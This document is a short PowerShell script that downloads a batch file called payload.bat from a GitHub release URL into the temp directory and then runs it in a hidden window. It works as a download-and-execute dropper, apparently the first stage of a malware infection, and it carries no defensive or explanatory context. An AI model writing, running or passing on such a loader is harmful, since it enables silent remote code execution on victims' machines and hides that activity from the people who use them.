# Direct URL to the batch file
$batUrl = "https://github.com/WotekSS/ft/releases/download/ytu/payload.bat"

# Temporary save location
$batPath = Join-Path $env:TEMP "remote_script.bat"

try {
    # Download the batch file
    Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing

    # Run the batch file hidden in the background
    Start-Process -FilePath $batPath -WindowStyle Hidden
}
catch {
    Write-Error "Failed to download or execute the batch file: $_"
}